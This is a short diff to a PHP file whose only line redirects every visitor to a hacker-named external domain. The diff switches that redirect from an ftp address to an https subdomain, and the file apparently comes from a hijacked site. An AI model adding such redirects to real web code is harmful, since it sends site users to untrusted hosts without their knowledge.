@@ -1,3 +1,3 @@
 <?php
-    header('Location: ftp://ihackednasausinght.ml:1337');
+    header('Location: https://redir.ihackednasausinght.ml');
 ?>
